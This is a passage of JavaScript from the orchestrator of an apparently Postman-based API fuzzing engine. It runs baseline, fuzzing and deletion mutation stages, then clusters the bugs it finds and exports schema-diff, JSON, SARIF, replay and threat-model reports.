            if (stats.stageResults.baseline) {
                stats.stageResults.baseline.forEach(res => {
                    if (res && res.responseBody) {
                        ResponseSchemaDiff.saveBaselineSchema(res.responseBody, MEMORY_LIMITS.maxCollectDepth);
                    }
                });
            }
        }
        
        if (!baselineOk || stats.abortReasons.length > 0) {
            printSummary(stats, ENGINE_VERSION, activeConfig, BugClustering, PostmanAdapter);
            return;
        }
        
        // 6. STAGE 1: Fuzzing
        await MutationStages.executeFuzzing(
            method, url, templateOriginal, allNodes, allStagesResults, bodyFormat, 
            provider, activeConfig, Utils, TemplateProcessor, httpClient, rateLimiter, 
            stats, ResponseAnalyzer, PostmanAdapter, SecurityTests
        );
        
        if (stats.abortReasons.length > 0) {
            printSummary(stats, ENGINE_VERSION, activeConfig, BugClustering, PostmanAdapter);
            return;
        }
        
        // 7. STAGE 2: Single Delete
        await MutationStages.executeSingleDelete(
            method, url, templateOriginal, allNodes, allStagesResults, bodyFormat, 
            provider, activeConfig, Utils, TemplateProcessor, httpClient, rateLimiter, 
            stats, ResponseAnalyzer
        );
        
        if (stats.abortReasons.length > 0) {
            printSummary(stats, ENGINE_VERSION, activeConfig, BugClustering, PostmanAdapter);
            return;
        }
        
        // 8. STAGE 3: Cumulative Delete
        await MutationStages.executeCumulativeDelete(
            method, url, templateOriginal, allNodes, allStagesResults, bodyFormat, 
            provider, activeConfig, Utils, TemplateProcessor, httpClient, rateLimiter, 
            stats, ResponseAnalyzer
        );
        
        // 9. Post-Processing
        console.log('\n🔍 POST-PROCESSING\n');
        
        const clusters = BugClustering.clusterBySignature(allStagesResults);
        stats.bugClusters = clusters;
        const sortedClusters = BugClustering.getSortedClusters(clusters);
        console.log(`Found ${sortedClusters.length} unique bug patterns\n`);
        
        // Schema Diff Analysis
        if (activeConfig.features && activeConfig.features.schemaDiff && typeof ResponseSchemaDiff !== 'undefined') {
            allStagesResults.forEach(res => {
                if (res && res.responseBody) {
                    ResponseSchemaDiff.compareWithBaseline(res, res.responseBody, MEMORY_LIMITS.maxCollectDepth);
                }
            });
            
            const diffStats = ResponseSchemaDiff.getStats();
            if (diffStats.totalDiffs > 0) {
                console.log(`📊 Schema changes: ${diffStats.totalDiffs} responses with differences`);
                ResponseSchemaDiff.export(activeConfig);
            }
        }
        
        // JSON Summary Report
        if (activeConfig.features && activeConfig.features.jsonSummary && typeof JSONSummaryReport !== 'undefined') {
            const jsonReport = JSONSummaryReport.generate(stats, ENGINE_VERSION, RUNTIME);
            JSONSummaryReport.export(jsonReport, activeConfig);
        }
        
        // SARIF Report
        if (activeConfig.features && activeConfig.features.sarifReport && typeof SARIFReport !== 'undefined') {
            const sarifReport = SARIFReport.generate(allStagesResults, stats, ENGINE_VERSION);
            SARIFReport.export(sarifReport, activeConfig);
        }
        
        // Replay Mode
        if (activeConfig.features && activeConfig.features.replayMode && typeof ReplayMode !== 'undefined') {
            const headers = typeof pm !== 'undefined' && pm.request ? pm.request.headers.toObject() : {};
            allStagesResults.forEach((res, idx) => {
                const replayId = typeof SARIFReport !== 'undefined' 
                    ? SARIFReport.generateReplayId(res, idx) 
                    : `replay_${idx}`;
                ReplayMode.collect(res, replayId, method, url, templateOriginal, bodyFormat, headers, SECURITY_CONFIG, activeConfig);
            });
            ReplayMode.export(activeConfig);
        }
        
        // Threat Model Documentation
        if (activeConfig.features && activeConfig.features.threatModelDoc && typeof ThreatModelDoc !== 'undefined') {
            ThreatModelDoc.export(activeConfig);
        }
        
        // Final Summary
        printSummary(stats, ENGINE_VERSION, activeConfig, BugClustering, PostmanAdapter);
        
        console.log(`\n🎉 ENGINE v${ENGINE_VERSION} - Execution Complete\n`);
        
    } catch (error) {
        console.error('❌ FATAL ERROR:', error.message);
        if (error.stack) console.log(error.stack);
        throw error;
    }
})().catch(err => {
    console.error('❌ UNHANDLED PROMISE REJECTION:', err);
});

console.log('✅ Main Entry Point (Orchestrator) - STARTED');